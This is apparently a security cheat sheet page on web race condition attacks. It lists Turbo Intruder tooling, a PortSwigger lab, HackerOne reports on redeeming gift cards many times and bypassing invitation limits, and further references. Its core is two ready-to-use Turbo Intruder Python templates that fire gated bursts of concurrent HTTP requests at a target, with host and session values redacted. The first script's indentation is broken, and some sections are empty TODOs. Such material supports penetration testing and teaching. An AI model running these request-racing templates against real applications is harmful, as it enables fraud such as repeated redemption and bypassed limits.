# Race Condition

> Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language. 

## Summary

- [Race Condition](#race-condition)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Labs](#labs)
  - [Limit-overrun](#limit-overrun)
  - [Rate-limit bypass](#rate-limit-bypass)
  - [Turbo Intruder](#turbo-intruder)
    - [Example 1](#example-1)
    - [Example 2](#example-2)
  - [References](#references)


## Tools

* [Turbo Intruder - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.](https://github.com/PortSwigger/turbo-intruder)


## Labs

* [PortSwigger - Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)


## Limit-overrun

TODO

**Examples**:

* [Race Condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
* [Race conditions can be used to bypass invitation limit - @franjkovic](https://hackerone.com/reports/115007)
* [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)


## Rate-limit bypass

TODO

**Examples**:

* []()


## Turbo Intruder

### Example 1

1. Send request to turbo intruder
2. Use this python code as a payload of the turbo intruder
    ```python
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            requestsPerConnection=30,
                            pipeline=False
                            )

    for i in range(30):
        engine.queue(target.req, i)
            engine.queue(target.req, target.baseInput, gate='race1')


        engine.start(timeout=5)
    engine.openGate('race1')

        engine.complete(timeout=60)


    def handleResponse(req, interesting):
        table.add(req)
    ```
3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder
4. Click "Attack"


### Example 2

This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.

```python
def queueRequests(target, wordlists): 
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=30, 
                           requestsPerConnection=100, 
                           pipeline=False 
                           ) 
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    ''' 

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30): 
        engine.queue(request2, gate='race1') 
    engine.openGate('race1') 
    engine.complete(timeout=60) 
def handleResponse(req, interesting): 
    table.add(req)
```

## References

* [DEF CON 31 - Smashing the State Machine the True Potential of Web Race Conditions - James Kettle](https://youtu.be/tKJzsaB1ZvI)
* [Turbo Intruder: Embracing the billion-request attack - James Kettle - 25 January 2019](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
* [Race Condition Bug In Web App: A Use Case - Mandeep Jadon - Apr 24, 2018](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
* [Race conditions on the web - Josip Franjkovic - July 12th, 2016](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
* [New techniques and tools for web race conditions - Emma Stocks - 10 August 2023](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)